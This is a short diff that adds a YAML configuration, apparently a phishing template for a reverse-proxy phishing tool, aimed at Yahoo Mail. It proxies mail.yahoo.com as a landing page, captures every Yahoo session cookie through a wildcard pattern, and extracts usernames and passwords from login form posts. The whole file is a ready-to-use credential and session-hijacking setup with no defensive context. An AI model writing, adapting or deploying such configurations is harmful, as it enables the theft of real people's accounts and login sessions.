@@ -1,0 +1,22 @@
+min_ver: '3.2.0'
+proxy_hosts:
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'yahoo.com', session: true, is_landing: true}
+sub_filters:
+auth_tokens:
+  - domain: '.yahoo.com'
+    keys: ['.*:regexp']
+auth_urls:
+  - '/login'
+  - '/ylogin'
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)' # regex in the event the date needs to be extracted
+    type: 'post'
+  password:
+    key: '.password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'mail.yahoo.com'
+  path: '/mail' #path to where the login is, on the domain
